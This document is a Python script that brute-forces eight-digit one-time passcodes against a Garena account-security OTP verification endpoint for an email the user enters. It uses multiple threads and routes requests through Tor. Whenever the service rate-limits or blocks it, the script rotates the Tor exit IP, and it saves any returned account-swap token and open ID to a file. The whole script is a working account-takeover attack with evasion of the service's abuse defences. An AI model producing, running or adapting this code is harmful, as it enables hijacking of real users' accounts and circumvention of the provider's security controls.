import requests, sys, re, time, random, threading, json, os, subprocess
from concurrent.futures import ThreadPoolExecutor
import warnings
warnings.filterwarnings('ignore')

email = input("Email: ")
threads = int(input("Threads (1-10): ") or "2")
use_tor = input("Use Tor? (y/n): ").lower() == 'y'

checked = 0
found = False
lock = threading.Lock()
tor_started = False
last_request_time = 0
request_lock = threading.Lock()
tor_process = None
running = True

def start_tor_termux():
    global tor_started, tor_process
    try:
        print("Starting Tor...")
        tor_process = subprocess.Popen(['tor'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(3)
        tor_started = True
        print("Tor started")
        return True
    except Exception as e:
        print(f"Tor start error: {e}")
        return False

def check_tor():
    try:
        test_session = requests.Session()
        test_session.proxies = {
            'http': 'socks5h://127.0.0.1:9050',
            'https': 'socks5h://127.0.0.1:9050'
        }
        test_session.verify = False
        test_session.timeout = 5
        r = test_session.get('https://check.torproject.org/', timeout=5)
        return r.status_code == 200
    except:
        return False

def rotate_tor_ip():
    try:
        import stem
        from stem import Signal
        from stem.control import Controller
        with Controller.from_port(port=9051) as controller:
            controller.authenticate()
            controller.signal(Signal.NEWNYM)
        print(f"IP rotated")
        time.sleep(1)
        return True
    except:
        try:
            import socks
            s = socks.socksocket()
            s.set_proxy(socks.SOCKS5, "127.0.0.1", 9050)
            s.settimeout(5)
            s.connect(("check.torproject.org", 80))
            s.send(b"GET / HTTP/1.0\r\nHost: check.torproject.org\r\n\r\n")
            s.recv(1024)
            s.close()
            print(f"IP rotated")
            time.sleep(1)
            return True
        except:
            return False

if use_tor:
    if start_tor_termux():
        time.sleep(2)
        if not check_tor():
            print("Tor not responding, disabling Tor")
            use_tor = False
            if tor_process:
                tor_process.terminate()
    else:
        print("Continuing without Tor")
        use_tor = False

def get_session():
    session = requests.Session()
    if use_tor and tor_started:
        session.proxies = {
            'http': 'socks5h://127.0.0.1:9050',
            'https': 'socks5h://127.0.0.1:9050'
        }
    session.verify = False
    session.timeout = 10
    return session

def try_otp(thread_id):
    global found, checked, running
    if found:
        return True
    
    otp = random.randint(0, 99999999)
    otp_str = str(otp).zfill(8)
    
    headers = {'User-Agent': 'GarenaMSDK/4.0.41', 'Accept': 'application/json', 'Content-Type': 'application/x-www-form-urlencoded'}
    session = get_session()
    
    try:
        with request_lock:
            current = time.time()
            elapsed = current - last_request_time
            if elapsed < 0.3:
                time.sleep(0.3 - elapsed)
        
        r = session.post('https://100067.connect.garena.com/game/account_security/swap:verify_otp', 
                         data={'app_id':'100067', 'email':email, 'otp':otp_str, 'locale':'en_HK'}, 
                         headers=headers, timeout=10)
        
        with lock:
            checked += 1
            print(f"[{checked}] Thread-{thread_id} | OTP: {otp_str} | Status: {r.status_code}")
        
        if r.status_code == 200:
            try:
                data = r.json()
                token = data.get('swap_token') or data.get('wap_token') or data.get('token')
                open_id = data.get('open_id')
                if token and open_id:
                    print(f"\nSUCCESS! OTP: {otp_str}")
                    print(f"Token: {token}")
                    print(f"OpenID: {open_id}")
                    with open("found.txt", "a") as f:
                        f.write(f"{email}|{otp_str}|{token}|{open_id}\n")
                    found = True
                    running = False
                    return True
            except:
                pass
        elif r.status_code == 429:
            print("Rate limited, rotating IP...")
            if use_tor:
                rotate_tor_ip()
            time.sleep(5)
        elif r.status_code in [403, 401, 400]:
            print(f"Blocked, rotating IP...")
            if use_tor:
                rotate_tor_ip()
            time.sleep(3)
        return False
    except Exception as e:
        print(f"Error: {e}")
        time.sleep(2)
        return False

print(f"\nTrying random OTPs for {email}")
print(f"Tor: {'Enabled' if use_tor else 'Disabled'}")
print("Press Ctrl+C to stop")
print("="*60)

with ThreadPoolExecutor(max_workers=threads) as executor:
    futures = []
    while running and not found:
        for i in range(threads):
            if not running or found:
                break
            futures.append(executor.submit(try_otp, i))
            time.sleep(0.1)
        
        for future in futures:
            if not running or found:
                break
            try:
                future.result(timeout=30)
            except:
                pass
        
        if not found and checked % 100 == 0:
            print(f"Checked {checked} OTPs...")

if not found:
    print("\nNOT_FOUND - No valid OTP found")

if tor_process:
    tor_process.terminate()